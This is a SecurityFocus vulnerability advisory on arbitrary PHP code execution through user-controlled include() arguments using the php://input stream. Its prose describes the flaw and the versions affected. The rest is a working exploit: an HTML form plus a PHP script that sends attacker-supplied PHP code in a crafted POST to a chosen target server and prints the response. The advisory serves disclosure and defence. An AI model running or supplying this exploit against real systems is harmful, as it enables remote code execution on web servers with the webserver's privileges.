source: http://www.securityfocus.com/bid/10427/info

PHP is reportedly affected by an arbitrary command-execution weakness through the PHP 'include()' function. This issue is due to a design error that allows the execution of attacker-supplied POST PHP commands when URI data is used as an argument to an 'include()' function.

This issue affect the PHP module itself; however, the problem presents itself only when an application uses a user-supplied URI parameter as an argument to the 'include()' function.

This issue is reported to affect all versions of PHP since 3.0.13. Furthermore, this issue is not resolved by setting the 'php.ini' variable 'allow_url_fopen' to off.

Successful exploitation of this issue will allow an attacker to execute arbitrary PHP code on the affected computer; this will allow the execution of commands to the underlying operating system with the privileges of the affected webserver process. 

<form action="" methode="post" >
target server : <input type="text" name="server" ><br><br>
target file (including URI parameter used in include() call ex:"index.php?includeParam=") : <input type="text" name="file" ><br><br>
exec (enclose php commands between <? .. ?> tags): <input type="text" name="cmd" ><br><br>
<INPUT type="submit" value="send">
</form>

<?
if($cmd){
$message  = "POST /".$file."php://input HTTP/1.1\r\n";
$message .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$message .= "Accept-Language: fr\r\n";
$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
$message .= "Accept-Encoding: deflate\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2)\r\n";
$message .= "Host: ".$server."\r\n";
$message .= "Content-length: ".strlen( $cmd )."\r\n";
$message .= "Connection: Keep-Alive\r\n";
$message .= "Cache-Control: no-cache\r\n";
$message .= "\r\n";
$message .= $cmd."\r\n";
$fd = fsockopen( $server, 80 );
fputs($fd,$message);
while(!feof($fd)) {
echo fgets($fd,1280);
}
fclose($fd);
}
?>